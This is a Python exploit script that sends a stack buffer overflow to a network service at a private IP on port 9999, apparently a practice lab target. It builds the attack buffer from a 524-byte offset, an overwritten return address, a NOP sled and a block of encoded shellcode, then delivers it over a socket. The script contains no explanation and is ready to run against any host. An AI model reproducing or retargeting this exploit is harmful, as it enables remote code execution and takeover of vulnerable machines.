import socket
import os

ip = "192.168.56.103"
port = 9999

# bad chars = \x0a

prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = (
  "\xd9\xd0\xba\xc3\x39\x95\xbe\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
  "\x52\x31\x56\x17\x83\xee\xfc\x03\x95\x2a\x77\x4b\xe5\xa5\xf5"
  "\xb4\x15\x36\x9a\x3d\xf0\x07\x9a\x5a\x71\x37\x2a\x28\xd7\xb4"
  "\xc1\x7c\xc3\x4f\xa7\xa8\xe4\xf8\x02\x8f\xcb\xf9\x3f\xf3\x4a"
  "\x7a\x42\x20\xac\x43\x8d\x35\xad\x84\xf0\xb4\xff\x5d\x7e\x6a"
  "\xef\xea\xca\xb7\x84\xa1\xdb\xbf\x79\x71\xdd\xee\x2c\x09\x84"
  "\x30\xcf\xde\xbc\x78\xd7\x03\xf8\x33\x6c\xf7\x76\xc2\xa4\xc9"
  "\x77\x69\x89\xe5\x85\x73\xce\xc2\x75\x06\x26\x31\x0b\x11\xfd"
  "\x4b\xd7\x94\xe5\xec\x9c\x0f\xc1\x0d\x70\xc9\x82\x02\x3d\x9d"
  "\xcc\x06\xc0\x72\x67\x32\x49\x75\xa7\xb2\x09\x52\x63\x9e\xca"
  "\xfb\x32\x7a\xbc\x04\x24\x25\x61\xa1\x2f\xc8\x76\xd8\x72\x85"
  "\xbb\xd1\x8c\x55\xd4\x62\xff\x67\x7b\xd9\x97\xcb\xf4\xc7\x60"
  "\x2b\x2f\xbf\xfe\xd2\xd0\xc0\xd7\x10\x84\x90\x4f\xb0\xa5\x7a"
  "\x8f\x3d\x70\x2c\xdf\x91\x2b\x8d\x8f\x51\x9c\x65\xc5\x5d\xc3"
  "\x96\xe6\xb7\x6c\x3c\x1d\x50\x53\x69\x25\xa1\x3b\x68\x55\xb0"
  "\xe7\xe5\xb3\xd8\x07\xa0\x6c\x75\xb1\xe9\xe6\xe4\x3e\x24\x83"
  "\x27\xb4\xcb\x74\xe9\x3d\xa1\x66\x9e\xcd\xfc\xd4\x09\xd1\x2a"
  "\x70\xd5\x40\xb1\x80\x90\x78\x6e\xd7\xf5\x4f\x67\xbd\xeb\xf6"
  "\xd1\xa3\xf1\x6f\x19\x67\x2e\x4c\xa4\x66\xa3\xe8\x82\x78\x7d"
  "\xf0\x8e\x2c\xd1\xa7\x58\x9a\x97\x11\x2b\x74\x4e\xcd\xe5\x10"
  "\x17\x3d\x36\x66\x18\x68\xc0\x86\xa9\xc5\x95\xb9\x06\x82\x11"
  "\xc2\x7a\x32\xdd\x19\x3f\x52\x3c\x8b\x4a\xfb\x99\x5e\xf7\x66"
  "\x1a\xb5\x34\x9f\x99\x3f\xc5\x64\x81\x4a\xc0\x21\x05\xa7\xb8"
  "\x3a\xe0\xc7\x6f\x3a\x21"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes(buffer + "\n", "latin-1"))
  #s.recv(1024)
  s.close()
except:
  print("Could not connect.")
